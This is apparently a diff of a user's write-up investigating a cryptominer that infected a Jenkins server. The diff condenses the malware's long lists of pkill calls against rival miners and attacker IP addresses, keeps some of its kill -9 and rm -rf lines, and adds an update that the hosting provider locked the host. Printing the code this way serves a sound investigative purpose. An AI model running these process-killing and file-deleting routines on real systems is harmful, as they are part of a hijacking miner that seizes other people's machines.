@@ -44,44 +44,11 @@ ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs kill -9
 ps -u jenkins|grep sh|grep -v irq|grep -v jenkins|grep -v grep|awk '{print $1}'|xargs kill -9
 #ps ax|grep httpd.conf|grep -v irq|grep -v grep|grep tmp|awk '{print $1}'|xargs kill -9
 ps -ef|grep .sh|grep tmp|grep -v irq|grep -v grep|grep -v gosh|cut -c 9-15|xargs kill -9
-pkill -f 45.76.102.45
 pkill -f stratum
 pkill -f mixnerdx
 pkill -f performedl
-pkill -f wget
-pkill -f sleep
-#pkill -f /tmp/httpd.conf
-pkill -f JnKihGjn
-pkill -f irqba2anc1
-pkill -f irqba5xnc1
-pkill -f irqbnc1
-pkill -f ir29xc1
-pkill -f conns
-pkill -f irqbalance
-pkill -f crypto-pool
-pkill -f minexmr
-pkill -f XJnRj
-pkill -f NXLAi
-pkill -f BI5zj
-pkill -f askdljlqw
-pkill -f minerd
-pkill -f minergate
-pkill -f Guard.sh
-pkill -f ysaydh
-pkill -f bonns
-pkill -f donns
-pkill -f kxjd
-pkill -f 108.61.186.224
-pkill -f Duck.sh
-pkill -f bonn.sh
-pkill -f conn.sh
-pkill -f kworker34
-pkill -f kw.sh
-pkill -f pro.sh
-pkill -f polkitd
-pkill -f acpid
+# ... tons of various pkill calls here ...
 ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
-pkill -f 45.76.146.166
 rm -rf /tmp/httpd.conf
 rm -rf /tmp/conn
 rm -rf /tmp/conns
@@ -146,39 +113,10 @@ if [ $? -ne 0 ]
             echo "process exists , sleep $sleepTime seconds "
             pkill -f cryptonight
             pkill -f apaceha
-            pkill -f 45.76.102.45
             pkill -f mixnerdx
             pkill -f performedl
-            pkill -f JnKihGjn
-            pkill -f irqba2anc1
-            pkill -f irqba5xnc1
-            pkill -f irqbnc1
-            pkill -f ir29xc1
-            pkill -f conns
-            pkill -f irqbalance
-            pkill -f crypto-pool
-            pkill -f minexmr
-            pkill -f XJnRj
-            pkill -f NXLAi
-            pkill -f BI5zj
-            pkill -f askdljlqw
-            pkill -f minerd
-            pkill -f Guard.sh
-            pkill -f ysaydh
-            pkill -f bonns
-            pkill -f donns
-            pkill -f kxjd
-            pkill -f 108.61.186.224
-            pkill -f Duck.sh
-            pkill -f bonn.sh
-            pkill -f conn.sh
-            pkill -f kworker34
-            pkill -f pro.sh
-            pkill -f polkitd
-            pkill -f acpid
-            pkill -f stratum
+            # ... tons of various pkill calls here ...
             ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
-            pkill -f 45.76.146.166
 
         fi
         sleep $sleepTime
@@ -194,3 +132,5 @@ Then script connects to 139.60.160.248 (it is located in `httpd.conf`) and do st
 I also thoght that it is possible to find wallet accepting address within binary file (as there is no such in config file), but got no luck. Probably it could be located inside `/proc/*/cmdline` or around, but now it's too late as the process was killed.
 
 Please let me know if you got ideas how to continue investigation.
+
+Update: After 24 hours head host was locked by hosting provider.
